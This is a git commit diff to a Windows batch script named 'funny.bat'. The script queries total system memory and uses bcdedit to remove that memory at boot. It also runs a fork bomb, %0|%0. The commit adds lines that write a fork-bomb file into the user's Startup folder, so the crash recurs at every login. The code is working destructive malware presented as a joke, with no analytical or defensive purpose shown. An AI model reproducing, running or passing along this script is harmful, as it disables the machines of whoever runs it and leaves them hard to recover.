7cda2abd56986db452db5daef1e8bfb42a71c8a2
frogillius <151787619+frogillius@users.noreply.github.com>
2024-06-11 19:35:28 -0700

    Update funny.bat

--- funny.bat
+++ funny.bat
@@ -1,4 +1,6 @@
 @echo off 
+cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+echo -e "%0|%0" > funny.bat
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
@@ -17,7 +19,6 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
-echo -e "%0|%0" > bashFile.sh
+
 %0|%0
  
